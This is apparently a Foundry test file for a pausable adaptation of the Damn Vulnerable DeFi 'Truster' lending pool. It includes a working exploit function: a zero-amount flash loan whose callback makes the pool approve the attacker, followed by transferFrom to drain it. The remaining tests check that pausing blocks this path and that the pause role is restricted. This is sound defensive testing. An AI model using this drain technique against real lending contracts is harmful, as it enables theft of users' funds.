// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test} from "forge-std/Test.sol";
import {Pausable} from "@openzeppelin/contracts/utils/Pausable.sol";
import {World} from "../script/World.sol";
import {PauseRole} from "../src/adapted/PauseRole.sol";
import {PausableTrusterLenderPool} from "../src/adapted/PausableTrusterLenderPool.sol";
import {TrusterHonestBorrower} from "../script/Truster.s.sol";
import {DamnValuableToken} from "../src/v4/DamnValuableToken.sol";

/// Seam E, ticket #27: Damn Vulnerable DeFi v4 Truster, adapted with BounTEE's standard pause.
/// Catches: the exploit (a zero-amount flash loan whose callback makes the pool approve the
/// attacker) drains the adapted pool while unpaused; once paused, the exploit's path refuses
/// to run (R7.5); the pause role can pause and nothing else (R8.2). Misses: the judge's verdict
/// on the exploit (seams J and T) and the posting check's simulated pause (#17).
contract TrusterTest is Test, World {
    address pauser = makeAddr("pauser");
    address attacker = makeAddr("attacker");
    Levels l;
    PausableTrusterLenderPool pool;
    DamnValuableToken token;

    function setUp() public {
        vm.deal(address(this), 2000 ether);
        l = deployLevels(pauser);
        pool = PausableTrusterLenderPool(l.truster);
        token = l.token;
    }

    function exploit() internal {
        vm.startPrank(attacker);
        pool.flashLoan(0, attacker, address(token), abi.encodeCall(token.approve, (attacker, TRUSTER_TOKENS)));
        token.transferFrom(address(pool), attacker, TRUSTER_TOKENS);
        vm.stopPrank();
    }

    /// The adaptation keeps the level's bug: unpaused, a fresh account drains the pool.
    function test_exploitDrainsTheAdaptedPoolWhileUnpaused() public {
        exploit();
        assertEq(token.balanceOf(address(pool)), 0);
        assertEq(token.balanceOf(attacker), TRUSTER_TOKENS);
    }

    /// R7.5: once paused, the exploit's path (`flashLoan`) refuses to run; the pool keeps its tokens.
    function test_R7_5_pausedPoolRefusesTheExploitPath() public {
        vm.prank(pauser);
        pool.pause();

        vm.prank(attacker);
        vm.expectRevert(Pausable.EnforcedPause.selector);
        pool.flashLoan(0, attacker, address(token), abi.encodeCall(token.approve, (attacker, TRUSTER_TOKENS)));
        assertEq(token.allowance(address(pool), attacker), 0);
        assertEq(token.balanceOf(address(pool)), TRUSTER_TOKENS);
    }

    /// The honest path (a flash loan repaid in the callback) works while unpaused, and not once paused.
    function test_honestFlashLoanRepaidWhileUnpaused_refusedOncePaused() public {
        TrusterHonestBorrower borrower = new TrusterHonestBorrower();
        borrower.borrowAndRepay(address(pool), 1000e18);
        assertEq(token.balanceOf(address(pool)), TRUSTER_TOKENS);

        vm.prank(pauser);
        pool.pause();
        vm.expectRevert(Pausable.EnforcedPause.selector);
        borrower.borrowAndRepay(address(pool), 1000e18);
    }

    /// R8.2: the pause role can pause, pausing again is harmless, and it has no unpause.
    function test_R8_2_pauseRoleCanPauseOnly() public {
        vm.startPrank(pauser);
        pool.pause();
        pool.pause();
        assertTrue(pool.paused());
        (bool ok,) = address(pool).call(abi.encodeWithSignature("unpause()"));
        assertFalse(ok, "no unpause");
        vm.expectRevert(Pausable.EnforcedPause.selector);
        pool.flashLoan(0, pauser, address(token), abi.encodeCall(token.approve, (pauser, TRUSTER_TOKENS)));
        vm.stopPrank();
        assertTrue(pool.paused());
        assertEq(token.allowance(address(pool), pauser), 0, "pauser moved nothing");
    }

    /// R8.2: only the pause role may pause.
    function testFuzz_R8_2_onlyThePauseRoleCanPause(address who) public {
        vm.assume(who != pauser);
        vm.prank(who);
        vm.expectRevert(PauseRole.NotPauser.selector);
        pool.pause();
        assertFalse(pool.paused());
    }
}
